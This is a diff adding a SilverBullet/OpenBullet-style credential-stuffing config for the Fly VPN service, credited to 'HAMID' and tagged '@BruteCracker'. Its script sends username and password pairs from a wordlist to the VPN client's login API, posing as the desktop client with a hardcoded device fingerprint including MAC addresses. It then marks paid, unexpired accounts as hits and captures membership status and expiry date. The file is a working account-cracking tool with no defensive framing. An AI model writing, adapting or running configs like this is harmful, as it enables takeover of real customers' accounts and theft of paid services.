@@ -1,0 +1,93 @@
+[SETTINGS]
+{
+  "Name": "Fly Vpn",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2022-02-02T21:19:03.7710217+03:30",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "HAMID",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Fly Vpn",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+REQUEST POST "https://210.56.61.157:4443/client.php" 
+  CONTENT "_lang=en&_m=win&_os_dev=American%20Megatrends%20Inc.%7cALASKA%20-%201072009%7c3408%7cSystem%20Serial%20Number&_os_did=VOL%3aF2CFD876&_os_dim=bi%3dAmerican%2520Megatrends%2520Inc.%257cALASKA%2520-%25201072009%257c3408%257cSystem%2520Serial%2520Number%26dv%3dVOL%253aF2CFD876%26ma%3d704d7b313d0a%252c00ff8b5f4a15%252c00ff86ed63a1&_os_lang=en-US&_os_ver=10.0%20B%3a19042%20S%3a%280.0%29%20amd64&_site=fly&_uid=61e6dfb302fc3eff2e8f&_vrf=2&cmd=ClientApiLogin%2fLogin&password=<PASS>&username=<USER>&v=6.3.0.8&trigger=login" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: 210.56.61.157:4443" 
+  HEADER "Accept: */*" 
+  HEADER "Connection: close" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Accept-Encoding: gzip, deflate" 
+  HEADER "Content-Length: 534" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Invalid username or password." 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "Unsubscribed" 
+    KEY "\"MembershipStatus\":\"Trial" 
+    KEY "\"Expired\":true" 
+  KEYCHAIN Success OR 
+    KEY "\"MembershipStatus\":\"Paid" 
+    KEY "\"Expired\":false" 
+
+PARSE "<SOURCE>" LR "\"ExpireTime\":\"" "\"" -> VAR "T" 
+
+PARSE "<SOURCE>" LR "MembershipStatus\":\"" "\"" CreateEmpty=FALSE -> CAP "MembershipStatus" 
+
+FUNCTION UnixTimeToDate "yyyy-MM-dd:HH-mm-ss" "<T>" -> CAP "ExpireTime" 
+
+FUNCTION Constant "@BruteCracker" -> CAP "By" 
+
